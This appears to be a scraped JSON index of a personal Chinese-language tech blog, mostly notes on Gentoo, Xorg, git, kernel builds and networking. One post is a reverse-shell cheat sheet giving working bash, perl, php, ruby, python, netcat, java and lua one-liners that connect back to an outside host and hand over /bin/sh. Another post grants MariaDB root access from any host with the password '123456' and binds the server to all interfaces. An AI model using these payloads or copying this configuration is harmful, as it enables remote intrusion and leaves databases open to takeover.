编辑new.md为你要写的blog内容 把new.md放到你要的分类目录 执行update.sh同步blog. 呵呵,完成了 hexo_new.md 12345#!/bin/bashset -xexport PATH=\"/usr/local/bin:/usr/bin:/bin:/opt/bin:/c/Windows/System32:/c/Windows:/c/Windows/System32/Wbem:/c/Windows/System32/WindowsPowerShell/v1.0/:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl:/opt/toolchain/gcc-linaro-6.3.1-2017.05-x86_64_arm-linux-gnueabihf/bin:/opt/FriendlyARM/toolschain/4.4.3/bin:/c/Users/jimmy/AppData/Roaming/npm:/c/Program Files/nodejs\"cd /e/hexo/hexo new \"new\" update.sh 12345678910111213#!/bin/bashset -xexport PATH=\"/usr/local/bin:/usr/bin:/bin:/opt/bin:/c/Windows/System32:/c/Windows:/c/Windows/System32/Wbem:/c/Windows/System32/WindowsPowerShell/v1.0/:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl:/opt/toolchain/gcc-linaro-6.3.1-2017.05-x86_64_arm-linux-gnueabihf/bin:/opt/FriendlyARM/toolschain/4.4.3/bin:/c/Users/jimmy/AppData/Roaming/npm:/c/Program Files/nodejs\"cd /e/demonelf.github.io/git pullcd /e/hexo/hexo grsync -Pv --size-only /e/hexo/public/* /e/demonelf.github.io/ -ar rsync -Pv --size-only /e/hexo/source/_posts/* /e/demonelf.github.io/ -arcd /e/demonelf.github.io/git add -Agit commit -m \"1.自动更新\"git push","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"x11vnc利用xvfd实现远程vncserver","slug":"SYSTEM/x11vnc利用xvfd实现远程vncserver","date":"2019-08-29T05:12:31.525Z","updated":"2019-08-29T05:10:31.812Z","comments":true,"path":"SYSTEM/x11vnc利用xvfd实现远程vncserver.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/x11vnc利用xvfd实现远程vncserver.html","excerpt":"当然你可以直接安装vncserver实现以下功能。例如：TigerVNC 环境：gentoo 安装：xvfd","text":"当然你可以直接安装vncserver实现以下功能。例如：TigerVNC 环境：gentoo 安装：xvfd sudo USE=”xvfb” emerge -av xorg-server 启动：xvfd Xvfb :2 -screen 0 800x600x24 -nolisten tcp &amp;export DISPLAY=:2 安装：x11vnc sudo emerge -av x11vnc 启动：x11vnc x11vnc -listen 0.0.0.0 -rfbport 5900 -noipv6 -passwd password -display :2 -forever 启动桌面： gnome-session –debug –disable-acceleration-check 然后启动你喜欢的vnc客户端连接吧 官方客户端为：ssvn 用此客户端可以实现自动缩放","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"rsync指定ssh端口号","slug":"SYSTEM/rsync指定ssh端口号","date":"2019-08-29T05:12:31.523Z","updated":"2019-08-29T05:10:26.172Z","comments":true,"path":"SYSTEM/rsync指定ssh端口号.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/rsync指定ssh端口号.html","excerpt":"","text":"rsync -P -e ‘ssh -p 2222’ busybox-armv7l admin@192.168.2.235:/storage/emulated/0/Download/","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"mariadb配置允许远程访问方式 ","slug":"SYSTEM/mariadb配置允许远程访问方式 ","date":"2019-08-29T05:12:31.520Z","updated":"2019-08-29T05:10:17.105Z","comments":true,"path":"SYSTEM/mariadb配置允许远程访问方式 .html","link":"","permalink":"http://demonelf.github.io/SYSTEM/mariadb配置允许远程访问方式 .html","excerpt":"首先配置允许访问的用户，采用授权的方式给用户权限 1GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'IDENTIFIED BY '123456' WITH GRANT OPTION; 说明：root是登陆数据库的用户，123456是登陆数据库的密码，*就是意味着任何来源任何主机反正就是权限很大的样子。","text":"首先配置允许访问的用户，采用授权的方式给用户权限 1GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'IDENTIFIED BY '123456' WITH GRANT OPTION; 说明：root是登陆数据库的用户，123456是登陆数据库的密码，*就是意味着任何来源任何主机反正就是权限很大的样子。 最后配置好权限之后不应该忘记刷新使之生效 flush privileges; 再次访问就可以了吧。 sudo vim /etc/mysql/my.cnf bind-address = 0.0.0.0 sudo systemctl restart mariadb.service","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"git reset revert 回退回滚取消提交返回上一版本","slug":"SYSTEM/git reset revert 回退回滚取消提交返回上一版本","date":"2019-08-29T05:12:31.515Z","updated":"2019-08-29T05:10:08.921Z","comments":true,"path":"SYSTEM/git reset revert 回退回滚取消提交返回上一版本.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/git reset revert 回退回滚取消提交返回上一版本.html","excerpt":"总有一天你会遇到下面的问题. (1)改完代码匆忙提交,上线发现有问题,怎么办? 赶紧回滚.","text":"总有一天你会遇到下面的问题. (1)改完代码匆忙提交,上线发现有问题,怎么办? 赶紧回滚. (2)改完代码测试也没有问题,但是上线发现你的修改影响了之前运行正常的代码报错,必须回滚. 这些开发中很常见的问题,所以git的取消提交,回退甚至返回上一版本都是特别重要的. 大致分为下面2种情况: 1.没有push 这种情况发生在你的本地代码仓库,可能你add ,commit 以后发现代码有点问题,准备取消提交,用到下面命令 resetgit reset [–soft | –mixed | –hard 上面常见三种类型 –mixed 会保留源码,只是将git commit和index 信息回退到了某个版本. git reset 默认是 –mixed 模式git reset –mixed 等价于 git reset –soft 保留源码,只回退到commit 信息到某个版本.不涉及index的回退,如果还需要提交,直接commit即可. –hard 源码也会回退到某个版本,commit和index 都回回退到某个版本.(注意,这种方式是改变本地代码仓库源码) 当然有人在push代码以后,也使用 reset –hard 回退代码到某个版本之前,但是这样会有一个问题,你线上的代码没有变,线上commit,index都没有变,当你把本地代码修改完提交的时候你会发现权是冲突….. 所以,这种情况你要使用下面的方式 2.已经push 对于已经把代码push到线上仓库,你回退本地代码其实也想同时回退线上代码,回滚到某个指定的版本,线上,线下代码保持一致.你要用到下面的命令 revert git revert用于反转提交,执行evert命令时要求工作树必须是干净的. git revert用一个新提交来消除一个历史提交所做的任何修改. revert 之后你的本地代码会回滚到指定的历史版本,这时你再 git push 既可以把线上的代码更新.(这里不会像reset造成冲突的问题) revert 使用,需要先找到你想回滚版本唯一的commit标识代码,可以用 git log 或者在adgit搭建的web环境历史提交记录里查看. git revert c011eb3c20ba6fb38cc94fe5a8dda366a3990c61 通常,前几位即可 git revert c011eb3 git revert是用一次新的commit来回滚之前的commit，git reset是直接删除指定的commit 看似达到的效果是一样的,其实完全不同. 第一: 上面我们说的如果你已经push到线上代码库, reset 删除指定commit以后,你git push可能导致一大堆冲突.但是revert 并不会. 第二: 如果在日后现有分支和历史分支需要合并的时候,reset 恢复部分的代码依然会出现在历史分支里.但是revert 方向提交的commit 并不会出现在历史分支里. 第三: reset 是在正常的commit历史中,删除了指定的commit,这时 HEAD 是向后移动了,而 revert 是在正常的commit历史中再commit一次,只不过是反向提交,他的 HEAD 是一直向前的.","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"gentoo安装metasploit4","slug":"SYSTEM/gentoo安装metasploit4.14步骤","date":"2019-08-29T05:12:31.513Z","updated":"2019-08-29T05:10:02.938Z","comments":true,"path":"SYSTEM/gentoo安装metasploit4.14步骤.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/gentoo安装metasploit4.14步骤.html","excerpt":"先来个小忍者看看 环境准备","text":"先来个小忍者看看 环境准备 make.conf中添加 RUBY_TARGETS=”ruby23” /etc/portage/package.keywords 中添加 =dev-lang/ruby-2.3.5 更新系统 emerge –ask –update –deep –newuse @world 选择ruby eselect ruby set ruby23 正式安装123456sudo emerge -av metasploitemerge --config postgresql/etc/init.d/postgresql-&lt;version&gt; start //systemctl start postgresql-&lt;version&gt;emerge --config =metasploit-4.14.16ln -s /usr/lib/metasploit/lib /home/demonelf/.msf4/lib","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"gentoo【显卡-驱动-xorg-gnome-gui】如何工作","slug":"SYSTEM/gentoo【显卡-驱动-xorg-gnome-gui】如何工作","date":"2019-08-29T05:12:31.510Z","updated":"2019-08-29T05:09:55.174Z","comments":true,"path":"SYSTEM/gentoo【显卡-驱动-xorg-gnome-gui】如何工作.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/gentoo【显卡-驱动-xorg-gnome-gui】如何工作.html","excerpt":"显卡-&gt;驱动-&gt;xorg-&gt;gnome-&gt;gui 查看显卡：lspci | grep -i VGA 查看驱动：lspci -vvv​","text":"显卡-&gt;驱动-&gt;xorg-&gt;gnome-&gt;gui 查看显卡：lspci | grep -i VGA 查看驱动：lspci -vvv​ /dev/nvidia0, /dev/nvidiactl 是NV 官方驱动引入的两个设备文件 驱动安装：x11-drivers/xf86-video-nouveau x11-drivers/xf86-video-virtualbox xorg支持： VIDEO_CARDS=”nouveau virtualbox” emerge -pv xorg-drivers 现在的xorg也不需要/etc/X11/xorg.conf注意把/etc/X11/xorg.conf.d/下默认的配置删除 例如:01-nv.conf 12345678910当然你就想手动指定驱动等信息添加xorg.conf也是没有问题的。例如：Section &quot;Device&quot; Identifier &quot;Configured Video Device&quot; Driver &quot;fbdev&quot; EndSection 以上显卡设备为lcd 驱动设备为：/dev/fb0驱动类型为：framebuffer xf86-video-fbdev大家可以看看韦东山介绍 mini2440就是用此驱动。framebuffer表示显卡不具备任何计算能力，完全利用cpu计算。 startx：为以上xorg gnome协同作战的脚本123456不用startx ，手动xorg的xinit和gnome的gnome-session都是可以的。xinit 找的是/dev/nvidia0, /dev/nvidiactlgnome-session 找的是export DISPLAY=:2 配置文件：.xinitrc12345678export GTK_IM_MODULE=ibusexport XMODIFIERS=@im=ibusexport QT_IM_MODULE=ibusexport XDG_MENU_PREFIX=gnome-xrandr --setprovideroutputsource modesetting NVIDIA-0xrandr --autoexec gnome-sessiondbus-launch nm-applet &amp; 12345678910111213141516171819202122232425262728293031323334353637383940414201:00.0 VGA compatible controller: NVIDIA Corporation G84GLM [Quadro FX 570M] (rev a1) (prog-if 00 [VGA controller]) Subsystem: Lenovo ThinkPad T61p Physical Slot: 1 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx- Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast &gt;TAbort- &lt;TAbort- &lt;MAbort- &gt;SERR- &lt;PERR- INTx- Latency: 0 Interrupt: pin A routed to IRQ 16 Region 0: Memory at d6000000 (32-bit, non-prefetchable) [size=16M] Region 1: Memory at e0000000 (64-bit, prefetchable) [size=256M] Region 3: Memory at d4000000 (64-bit, non-prefetchable) [size=32M] Region 5: I/O ports at 2000 [size=128] [virtual] Expansion ROM at 000c0000 [disabled] [size=128K] Capabilities: [60] Power Management version 2 Flags: PMEClk- DSI- D1- D2- AuxCurrent=0mA PME(D0-,D1-,D2-,D3hot-,D3cold-) Status: D0 NoSoftRst- PME-Enable- DSel=0 DScale=0 PME- Capabilities: [68] MSI: Enable- Count=1/1 Maskable- 64bit+ Address: 0000000000000000 Data: 0000 Capabilities: [78] Express (v1) Endpoint, MSI 00 DevCap: MaxPayload 128 bytes, PhantFunc 0, Latency L0s &lt;512ns, L1 &lt;4us ExtTag+ AttnBtn- AttnInd- PwrInd- RBE+ FLReset- SlotPowerLimit 75.000W DevCtl: Report errors: Correctable- Non-Fatal- Fatal- Unsupported- RlxdOrd+ ExtTag+ PhantFunc- AuxPwr- NoSnoop+ MaxPayload 128 bytes, MaxReadReq 512 bytes DevSta: CorrErr- UncorrErr- FatalErr- UnsuppReq- AuxPwr- TransPend- LnkCap: Port #0, Speed 2.5GT/s, Width x16, ASPM L0s L1, Exit Latency L0s &lt;512ns, L1 &lt;4us ClockPM- Surprise- LLActRep- BwNot- ASPMOptComp- LnkCtl: ASPM L0s Enabled; RCB 128 bytes Disabled- CommClk+ ExtSynch- ClockPM- AutWidDis- BWInt- AutBWInt- LnkSta: Speed 2.5GT/s, Width x16, TrErr- Train- SlotClk+ DLActive- BWMgmt- ABWMgmt- Capabilities: [100 v1] Virtual Channel Caps: LPEVC=0 RefClk=100ns PATEntryBits=1 Arb: Fixed- WRR32- WRR64- WRR128- Ctrl: ArbSelect=Fixed Status: InProgress- VC0: Caps: PATOffset=00 MaxTimeSlots=1 RejSnoopTrans- Arb: Fixed- WRR32- WRR64- WRR128- TWRR128- WRR256- Ctrl: Enable+ ID=0 ArbSelect=Fixed TC/VC=01 Status: NegoPending- InProgress- Capabilities: [128 v1] Power Budgeting &lt;?&gt; Capabilities: [600 v1] Vendor Specific Information: ID=0001 Rev=1 Len=024 &lt;?&gt; Kernel driver in use: nvidia Kernel modules: nouveau, nvidia_drm, nvidia 注: 之前virtualbox的驱动总是不能成功, 改为vesa折中解决. 具体为删除virtualbox驱动, emerge -C virtualbox-guest-additions 如果启动还是加载vboxvideo等驱动, 那就直接删除重新安装 123rm /lib/modules/* -rf cd /usr/src/linux &amp;&amp; make modules_installemerge -av @module-rebuild 并且添加/etc/X11/xorg.conf.d/10-monitor.conf 12345678910111213141516171819Section \"Monitor\" Identifier \"Monitor0\"EndSectionSection \"Device\" Identifier \"Device0\" Driver \"vesa\" #Choose the driver used for this monitorEndSectionSection \"Screen\" Identifier \"Screen0\" #Collapse Monitor and Device section to Screen section Device \"Device0\" Monitor \"Monitor0\" DefaultDepth 16 #Choose the depth (16||24) SubSection \"Display\" Depth 16 Modes \"1024x768_75.00\" #Choose the resolution EndSubSectionEndSection 这样省了virtualbox 驱动版本等匹配问题.当然性能也下降了. 当然我自己还挖了个坑 那就是还要删除 /etc/local.d/nvidia.start不然重启又修改了 当然安装vboxvideo 会提高性能 只要在/etc/portage/make.conf添加 VIDEO_CARDS=”virtualbox vesa fbdev” 并更新下系统就可以 emerge -avtuDN world 如果/etc/X11/xorg.conf 和/etc/X11/xorg.conf.d 不会配置 建议直接删除就可以了 同时可参考: https://wiki.gentoo.org/wiki/VirtualBox","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"gentoo_stage_diy","slug":"SYSTEM/gentoo_stage_diy","date":"2019-08-29T05:12:31.507Z","updated":"2019-08-29T05:09:48.911Z","comments":true,"path":"SYSTEM/gentoo_stage_diy.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/gentoo_stage_diy.html","excerpt":"stage1：12345包含bootstrap.sh，scripts/bootstrap.sh用于安装glibc、gcc、zlib、binutils、textinfo、ncurses、gettext、sed、emerge、portage等创建stage2 包含emerge的环境执行：scripts/bootstrap.sh stage2:123包含了完整的emerge的环境构建system系统，编译没有替代物的系统软件包。执行：emerge -e system 构想：","text":"stage1：12345包含bootstrap.sh，scripts/bootstrap.sh用于安装glibc、gcc、zlib、binutils、textinfo、ncurses、gettext、sed、emerge、portage等创建stage2 包含emerge的环境执行：scripts/bootstrap.sh stage2:123包含了完整的emerge的环境构建system系统，编译没有替代物的系统软件包。执行：emerge -e system 构想： stage1可以通过lfs方法得到 stage1要保证能运行bootstrap.sh和emerge bootstrap.sh：bash portage:bash python stage1 在通过bootstrap.sh生成stage2 参考： https://wiki.gentoo.org/wiki/Project:Prefix/Bootstrap 我们可以运行：emerge -e system 生成官方提供的的stage3了。 以上stage2环境可以由lfs替代.直接在lfs或其它系统上安装porage， 所以共有两种安装方法： 第一种： 1.下载stage1 2.bootstrap.sh 3.emerge system 4.stage3正常安装 第二种： 1.创建lfs 2.安装portage 3.emerge system 4.emerge world 参考：https://wiki.gentoo.org/wiki/Portage","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"Linux下NC反弹shell命令","slug":"SYSTEM/Linux下NC反弹shell命令","date":"2019-08-29T05:12:31.504Z","updated":"2019-08-29T05:09:41.711Z","comments":true,"path":"SYSTEM/Linux下NC反弹shell命令.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/Linux下NC反弹shell命令.html","excerpt":"本机开启监听： 12nc -lvnp 4444nc -vvlp 4444 目标机器开启反弹bash版本：","text":"本机开启监听： 12nc -lvnp 4444nc -vvlp 4444 目标机器开启反弹bash版本： 1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 perl版本： 1perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;' php版本： 1php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' ruby版本： 1ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)' python版本： 1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' nc版本： 123nc -e /bin/sh 10.0.0.1 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999 java版本： 123r = Runtime.getRuntime()p = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])p.waitFor() lua版本： 1lua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');\" NC版本不使用-e参数： 12345mknod /tmp/backpipe p/bin/sh 0&lt;/tmp/backpipe | nc x.x.x.x 4444 1&gt;/tmp/backpipe/bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"Linux 内核编译 —— make localmodconfig 简化内核配置流程  ","slug":"SYSTEM/Linux 内核编译 —— make localmodconfig 简化内核配置流程  ","date":"2019-08-29T05:12:31.502Z","updated":"2019-08-29T05:09:33.928Z","comments":true,"path":"SYSTEM/Linux 内核编译 —— make localmodconfig 简化内核配置流程  .html","link":"","permalink":"http://demonelf.github.io/SYSTEM/Linux 内核编译 —— make localmodconfig 简化内核配置流程  .html","excerpt":"简介：前些天才知道， Linux 2.6.32 开始引入了一个 make localmodconfig 用于简化 kernel 的配置。刚刚找了一下这个方面的资料，分享一下。 Most people uses the kernel shipped by distros - and that’s good. But some people like to compile their own kernels from kernel.org, or maybe they like following the Linux development and want to try it. Configuring your own kernel, however, has become a very difficult and tedious task - there’re too many options, and some times userspace software will stop working if you don’t enable some key option. You can use a standard distro .config file, but it takes too much time to compile all the options it enables. To make the process of configuration easier, a new build target has been added: make localmodconfig. It runs “lsmod” to find all the modules loaded on the current running system. It will read all the Makefiles to map which CONFIG enables a module. It will read the Kconfig files to find the dependencies and selects that may be needed to support a CONFIG. Finally, it reads the .config file and removes any module “=m” that is not needed to enable the currently loaded modules. With this tool, you can strip a distro .config of all the unuseful drivers that are not needed in our machine, and it will take much less time to build the kernel. There’s an additional “make localyesconfig” target, in case you don’t want to use modules and/or initrds.","text":"简介：前些天才知道， Linux 2.6.32 开始引入了一个 make localmodconfig 用于简化 kernel 的配置。刚刚找了一下这个方面的资料，分享一下。 Most people uses the kernel shipped by distros - and that’s good. But some people like to compile their own kernels from kernel.org, or maybe they like following the Linux development and want to try it. Configuring your own kernel, however, has become a very difficult and tedious task - there’re too many options, and some times userspace software will stop working if you don’t enable some key option. You can use a standard distro .config file, but it takes too much time to compile all the options it enables. To make the process of configuration easier, a new build target has been added: make localmodconfig. It runs “lsmod” to find all the modules loaded on the current running system. It will read all the Makefiles to map which CONFIG enables a module. It will read the Kconfig files to find the dependencies and selects that may be needed to support a CONFIG. Finally, it reads the .config file and removes any module “=m” that is not needed to enable the currently loaded modules. With this tool, you can strip a distro .config of all the unuseful drivers that are not needed in our machine, and it will take much less time to build the kernel. There’s an additional “make localyesconfig” target, in case you don’t want to use modules and/or initrds. 以上内容摘自：Kernel Newbies。大概意思是说， make localmodconfig 会执行 lsmod 命令查看当前系统中加载了哪些模块 (Modules)， 并最后将原来的 .config 中不需要的模块去掉，仅保留前面 lsmod 出来的这些模块，从而简化了内核的配置过程。 这样做确实方便了很多，但是也有个缺点：该方法仅能使编译出的内核支持当前内核已经加载的模块。因为该方法使用的是 lsmod 的结果，如果有的模块当前没有加载，那么就不会编到新的内核中。例如，我有的时候需要制作 squashfs ， 因此在当前的内核中，将 squashfs 编译成了模块。 当使用 make localmodconfig 来配置 Kernel 的时候，如果当前系统中没有加载这个模块， 那么新编出来的内核中就不会将 squashfs 编译成模块，在新的内核中就没办法使用这个模块了。 所以建议在使用 make localmodconfig 之前，首先折腾一下系统，插个优盘，开开摄像头之类， 以便让内核加载上平时使用时候所需要的模块；执行 make localmodconfig 之后，再执行一下 make menuconfig 来手动检查一下， 是否还有其他模块需要手动选择。 这样，内核的编译可以分成如下几个步骤来进行： 下载解压内核源码：http://www.kernel.org， 折腾一下系统，让它将合适的 module 都加载上。 执行 make localmodconfig 精减不需要的模块。 执行 make menuconfig ，检查一下是否有自己需要的模块没有选上。 执行 make 进行编译 执行 make modules_install 安装模块 执行 make install 安装内核 编辑 /boot/grub/grub.conf 或者 /boot/grub/menu.lst 添加新的引导菜单。 重启并以新的内核启动。 OK, that’s all. Author:yangyingchao, 2010-09-13","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"Github上怎么修改别人的项目并且提交给原作者！图文并茂！","slug":"SYSTEM/Github上怎么修改别人的项目并且提交给原作者！图文并茂！","date":"2019-08-29T05:12:31.499Z","updated":"2019-08-29T05:09:26.344Z","comments":true,"path":"SYSTEM/Github上怎么修改别人的项目并且提交给原作者！图文并茂！.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/Github上怎么修改别人的项目并且提交给原作者！图文并茂！.html","excerpt":"Github上怎么修改别人的项目并且提交给原作者！图文并茂！ 写这篇博客的初衷，是因为我的项目Only需要一些朋友一起参与进来，但是很多的Git都不是很熟练，其实版本控制这种东西没有什么难度的，只要稍微掌握以下就好了，如果有兴趣的话也可以到Only这个项目进来","text":"Github上怎么修改别人的项目并且提交给原作者！图文并茂！ 写这篇博客的初衷，是因为我的项目Only需要一些朋友一起参与进来，但是很多的Git都不是很熟练，其实版本控制这种东西没有什么难度的，只要稍微掌握以下就好了，如果有兴趣的话也可以到Only这个项目进来 Only:https://github.com/LiuGuiLinAndroid/Only 好的，不多说，直接开车了，我们先简单的找一个项目，比如这个项目，我需要更改他的内容，我们就直接fork这个项目 紧接着你就可以看到这个项目已经被你fork了 现在我们就可以直接clone下我们自己的项目来了 git clone xxxx 我们clone下来之后就可以更改了，这里我就在说明文件里加一句话：到此一游就好了，紧接着，我们提交 到这里，我们就可以在Github上看到我们自己的更新了 然后我们点击项目上的Pull request去请求 在这里写上我们的更新日志和更改了什么东西，然后点击Create pull request 到这里，就没有我们什么事了，我们只要等待作者收到邮件同意我们的更新就好了，那作者哪里做了什么呢？ 当他收到这个请求就会看到 只要点击同意，我们的提交就合并到他的代码里去了，就可以看到提交信息了 这个时候你的代码就静静的躺在作者的Github里了","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"如何提高自己","slug":"LIVE/如何提高自己","date":"2019-08-29T05:12:31.496Z","updated":"2019-08-29T05:08:37.584Z","comments":true,"path":"LIVE/如何提高自己.html","link":"","permalink":"http://demonelf.github.io/LIVE/如何提高自己.html","excerpt":"","text":"平易近人。做为一个人，想受到别人的爱戴，首先自己对人就得友善，不管对任何人就应该一视同仁。 为人真诚。一个人经常的耍点小聪明，经常的觉得别人永远在自己的手掌中，那么这样的人不仅赢不了别人的喜欢，而且还会让自己孤立。 助人为乐。帮助别人，快乐自己。经常帮助别人的人经常让别人觉得自己的善良，让别人感受到自己的亲近。 优秀。让自己变得优秀，优秀的人没有人会不喜欢，没有人会不尊重，因此让自己努力变成一个某一方面优秀的人，可以让自己受到别人的尊重。 不小看别人。三十年河东，三十年河西。焉知别人今后就没有翻身的一天，所以对人千万不要抬着头。 不骄不燥。做人还不能骄傲，也不能浮燥，骄傲的人容易落后，浮燥的人做事情容易失败。","categories":[{"name":"LIVE","slug":"LIVE","permalink":"http://demonelf.github.io/categories/LIVE/"}],"tags":[]},{"title":"CAN与以太网区别","slug":"EMBEDDED/CAN与以太网区别","date":"2019-08-29T05:12:31.470Z","updated":"2019-08-29T05:05:45.148Z","comments":true,"path":"EMBEDDED/CAN与以太网区别.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/CAN与以太网区别.html","excerpt":"工业以太网与CAN总线的比较(2008-07-19 20:49:20) 2008-07-23 10:45","text":"工业以太网与CAN总线的比较(2008-07-19 20:49:20) 2008-07-23 10:45 1. 工业以太网的优势及存在问题(1)优势基于TCP / IP的以太网是一种标准开放式的网络,由其组成的系统兼容性和互操作性好,资源共享能力强,可以很容易的实现将控制现场的数据与信息系统上的资源共享;数据的传输距离长、传输速率高;易与Internet连接,低成本、易组网,与计算机、服务器的接口十分方便,受到了广泛的技术支持。(2)存在问题以太网采用的是带有冲突检测的载波侦听多路访问协议(CSMA /CD) ,无法保证数据传输的实时性要求,是一种非确定性的网络系统; 安全可靠性问题,以太网采用超时重发机制,单点的故障容易扩散,造成整个网络系统的瘫痪;对工业环境的适应能力问题,目前工业以太网的鲁棒性和抗干扰能力等都是值得关注的问题,很难适应环境恶劣的工业现场;本质安全问题,在存在易燃、易爆、有毒等环境的工业现场必须要采用安全防爆技术;总线供电问题。在环境恶劣危险场合,总线供电具有十分重要的意义。2. CAN现场总线的特点及局限性(1)特点CAN现场总线的数据通信具有突出的可靠性、实时性和灵活性。主要表现在CAN为多主方式工作; CAN总线的节点分成不同的优先级;采用非破坏仲裁技术;报文采用短帧结构,数据出错率极低;节点在错误严重的情况下可自动关闭输出。(2)局限性CAN现场总线作为一种面向工业底层控制的通信网络,其局限性也是显而易见的。首先,它不能与Internet互连,不能实现远程信息共享。其次,它不易与上位控制机直接接口,现有的CAN接口卡与以太网网卡相比大都价格昂贵。还有, CAN现场总线无论是其通信距离还是通信速率都无法和以太网相比。3. 工业以太网和CAN现场总线的网络协议规范比较工业以太网和CAN现场总线的网络协议规范都遵循ISO /OSI参考模型的基本层次结构。工业以太网采用IEEE802参考模型,相当于OSI模型的最低两层,即物理层和数据链路层,其中数据链路层包含介质访问控制子层(MAC)和逻辑链路控制子层(LLC) 。CAN现场总线的ISO /OSI参考模型也是分为两层,并与工业以太网的分层结构完全相同,但是二者在各层的物理实现及通信机理上却有很大的差别。工业以太网和CAN现场总线的各层在具体网络协议实现上的分析比较如下表所示。 工业以太网CAN现场总线 物理层传输介质TP5类线、屏蔽双绞线、同轴电缆、光纤、无线传输等屏蔽双绞线、同轴电缆、光纤、无线传输等编码同步 NRZ、曼彻斯特编码异步 NRZ 插件RJ45、AUI、BNC各种防护等级的工业级插件 总线供电和本质安全无有 传输速率10M、100M等5 kbps～1Mbps 数据链路层介质访问控制子层介质访问方式采用 CSMA/CD （载波监听多路访问/冲突检测），工业以太网很难满足工业网络通信的实时性和确定性的要求,在网络负载很重的情况下可能出现网络瘫痪的情况。负责报文分帧、仲裁、应答、错误检测和标定。采用非破坏总线仲裁技术及短帧传送数据,能够满足工业控制的实时性和确定性的要求,而且在网络负载很重的情况下也不会出现网络瘫痪的情况。逻辑链路控制子层组帧、处理传输差错、调整帧流速。报文滤波、过载通知及恢复管理。","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"BGPMPLS VPN的江湖恩仇录","slug":"EMBEDDED/BGPMPLS VPN的江湖恩仇录","date":"2019-08-29T05:12:31.459Z","updated":"2019-08-29T05:05:34.713Z","comments":true,"path":"EMBEDDED/BGPMPLS VPN的江湖恩仇录.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/BGPMPLS VPN的江湖恩仇录.html","excerpt":"MPLS 一、MPLS物种起源","text":"MPLS 一、MPLS物种起源 • IP的危机 在90年代中期，当时路由器技术的发展远远滞后于网络的发展速度与规模，主要表现在转发效率低下、无法提供QOS保证。原因是：当时路由查找算法使用最长匹配原则，必须使用软件查找；而IP的本质就是”只关心过程，不注重结果”的”尽力而为”。当时江湖上流行一种论调：过于简单的IP技术无法承载网络的未来，基于IP技术的因特网必将在几年之后崩溃。 • ATM的野心 